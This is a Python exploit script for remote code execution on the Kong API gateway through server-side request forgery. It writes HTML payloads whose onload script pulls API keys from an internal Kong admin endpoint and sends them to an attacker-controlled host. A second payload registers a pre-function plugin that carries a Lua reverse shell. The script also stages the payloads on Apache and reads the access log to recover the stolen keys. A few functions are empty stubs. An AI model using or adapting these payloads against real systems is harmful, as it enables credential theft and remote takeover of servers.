"""
Author: Aleksa Zatezalo
Date: March 2025
Description: A remote code execution exploit that leverages SSRF on the Kong API gateway.
"""

import re
import json
import urllib.parse
import os
import subprocess

def createAPIHTML(lhost):
    """
    Creates HTML for API key exfiltration, replacing the hardcoded IP with lhost.
    
    Args:
        lhost (str): The host to send exfiltrated data to
        
    Returns:
        str: Formatted HTML with the specified host
    """
    html_template = f'''<html>
<head>
<script>
function exfiltrate() {{
    fetch("http://172.16.16.2:8001/key-auths")
    .then((response) => response.text())
    .then((data) => {{
        fetch("http://{lhost}/callback?" + encodeURIComponent(data));
    }}).catch(err => {{
        fetch("http://{lhost}/error?" + encodeURIComponent(err));
    }}); 
}}
</script>
</head>
<body onload='exfiltrate()'>
<div></div>
</body>
</html>'''
    
    return html_template

def parseForKey(response):
    """
    Extracts the API key from a URL-encoded callback response in a log entry.
    
    Args:
        response (str): Log entry string containing the callback URL with JSON data
        
    Returns:
        str: The extracted API key or None if not found
    """
    # Extract the URL-encoded query parameter using regex
    match = re.search(r'GET /callback\?([^ ]+)', response)
    if not match:
        return None
    
    # URL decode the parameter
    encoded_data = match.group(1)
    decoded_data = urllib.parse.unquote(encoded_data)
    
    try:
        # Parse the JSON data
        data = json.loads(decoded_data)
        
        # Extract the key from the first item in the data array
        if data and 'data' in data and isinstance(data['data'], list) and len(data['data']) > 0:
            for item in data['data']:
                if 'key' in item:
                    return item['key']
        
        return None
    except json.JSONDecodeError:
        return None

def parseLogAPI():
    """
    Monitors the Apache access log for API key exfiltration callbacks,
    parses them using parseForKey and prints any found keys.
    
    Returns:
        str: The first discovered API key, or None if no key is found
    """
    try:
        # Call tail on the Apache access log
        process = subprocess.Popen(
            ['sudo', 'tail', '/var/log/apache2/access.log'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        
        # Read the output
        stdout, stderr = process.communicate()
        
        if stderr:
            print(f"[!] Error reading log file: {stderr}")
            return None
        
        # Process each line
        found_key = None
        for line in stdout.splitlines():
            # Check if the line contains callback
            if '/callback?' in line:
                key = parseForKey(line)
                if key:
                    print(f"[+] Found API key: {key}")
                    if not found_key:
                        found_key = key
        
        if not found_key:
            print("[-] No API keys found in recent log entries")
        
        return found_key
        
    except Exception as e:
        print(f"[!] Error in parseLogAPI: {str(e)}")
        return None

def checkPlugins(url, apikey):
    """
    Checks Kong Admin Panel to see if a plugin supporting RCE is enabled on the Admin panel.
    """
    
    pass

def makeShell(lhost, lport):
    """
    Returns a lua revshell for lhost and lport.
    """

    return f"local s=require('socket');local t=assert(s.tcp());t:connect('{lhost}',{lport});while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"

def formatRCEHTML(lhost, lport):
    """
    Formats HTML RCE code.
    """
    shell = makeShell(lhost, lport)
    
    html_template = f'''<html>
<head>
<script>
function createService() {{
    fetch("http://172.16.16.2:8001/services", {{
      method: "post",
      headers: {{ "Content-Type": "application/json" }},
      body: JSON.stringify({{"name":"supersecret", "url": "http://127.0.0.1/"}})
    }}).then(function (route) {{
      createRoute();
    }});
}}
function createRoute() {{
    fetch("http://172.16.16.2:8001/services/supersecret/routes", {{ 
      method: "post",
      headers: {{ "Content-Type": "application/json" }},
      body: JSON.stringify({{"paths": ["/supersecret"]}})
    }}).then(function (plugin) {{
      createPlugin();
    }});  
}}
function createPlugin() {{
    fetch("http://172.16.16.2:8001/services/supersecret/plugins", {{ 
      method: "post",
      headers: {{ "Content-Type": "application/json" }},
      body: JSON.stringify({{"name":"pre-function", "config" :{{ "access" :[ "{shell}" ]}}}})
    }}).then(function (callback) {{
      fetch("http://{lhost}/callback?setupComplete");
    }});  
}}
</script>
</head>
<body onload='createService()'>
<div></div>
</body>
</html>'''
    
    return html_template


def startServer(lhost, lport):
    """
    Starts apache server and moves HTML payload to server.
    
    Args:
        lport (int): Local port for reverse shell connection
        lhost (str): Local host IP address for callbacks and reverse shell
    """
    # Create directory if it doesn't exist
    os.makedirs('/var/www/html', exist_ok=True)
    
    # Generate and save API key exfiltration HTML
    keys_html = createAPIHTML(lhost)
    with open('/var/www/html/keys.html', 'w') as f:
        f.write(keys_html)
    
    # Generate and save RCE HTML
    rce_html = formatRCEHTML(lhost, lport)
    with open('/var/www/html/rce.html', 'w') as f:
        f.write(rce_html)
    
    # Set appropriate permissions
    subprocess.run(['sudo', 'chmod', '644', '/var/www/html/keys.html'])
    subprocess.run(['sudo', 'chmod', '644', '/var/www/html/rce.html'])
    
    # Start Apache server
    subprocess.run(['sudo', 'systemctl', 'start', 'apache2'])
    
    print(f"[+] Server started at http://{lhost}/")
    print(f"[+] API key exfiltration payload available at: http://{lhost}/keys.html")
    print(f"[+] RCE payload available at: http://{lhost}/rce.html")
    print(f"[+] Listening for reverse shell on port {lport}")

def createPlugin(url, lport, lhost):
    """
    Sends a request to get the proper plugin.
    """

    pass

def getRCE(url):
    """
    Self explanitory.
    """

    pass